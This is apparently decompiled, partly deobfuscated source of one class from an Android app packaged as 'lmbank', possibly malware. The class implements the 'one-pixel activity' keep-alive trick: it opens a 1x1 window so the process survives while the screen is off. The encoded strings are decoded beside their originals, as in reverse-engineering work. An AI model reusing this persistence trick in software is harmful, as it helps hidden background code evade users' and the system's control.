package com.wish.lmbank.keeplive.activity;

import android.app.Activity;
import android.os.Bundle;
import android.os.PowerManager;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;

import com.wish.lmbank.utils.LogUtils;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/keeplive/activity/OnePixelActivity.class */
public final class OnePixelActivity extends Activity {
    public static Activity instance;
    public static boolean isClose = true;
    private final String TAG = OnePixelActivity.class.getName();

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        isClose = false;
        instance = this;
        Window window = getWindow();
        window.setGravity(Gravity.START);
        WindowManager.LayoutParams attributes = window.getAttributes();
        attributes.x = 0;
        attributes.y = 0;
        attributes.height = 1;
        attributes.width = 1;
        window.setAttributes(attributes);
        return;
    }

    @Override // android.app.Activity
    protected void onResume() {
        super.onResume();
//         LogUtils.v(this.TAG + bb7d7pu7.m5998("RUkGBzsMGhwEDA"), new Object[0]);
        LogUtils.v(this.TAG + ", onResume", new Object[0]);
//         checkScreenOn(bb7d7pu7.m5998("Bgc7DBocBAw"));
        checkScreenOn("onResume");
        return;
    }

    private void checkScreenOn(String str) {
        try {
//             boolean isScreenOn = ((PowerManager) getApplicationContext().getSystemService(bb7d7pu7.m5998("GQYeDBs"))).isScreenOn();
            boolean isScreenOn = ((PowerManager) getApplicationContext().getSystemService("power")).isScreenOn();
//             LogUtils.v(this.TAG + bb7d7pu7.m5998("RUkAGjoKGwwMByYHU0k") + isScreenOn, new Object[0]);
            LogUtils.v(this.TAG + ", isScreenOn: " + isScreenOn, new Object[0]);
            if (isScreenOn) {
                finish();
                return;
            }
            return;
        } catch (Exception e) {
//             LogUtils.v(this.TAG + bb7d7pu7.m5998("RUkMEQoMGR0ABgdTSQ") + e.getLocalizedMessage(), new Object[0]);
            LogUtils.v(this.TAG + ", exception: " + e.getLocalizedMessage(), new Object[0]);
            return;
        }
    }

    @Override // android.app.Activity
    protected void onDestroy() {
        super.onDestroy();
        isClose = true;
        instance = null;
    }
}
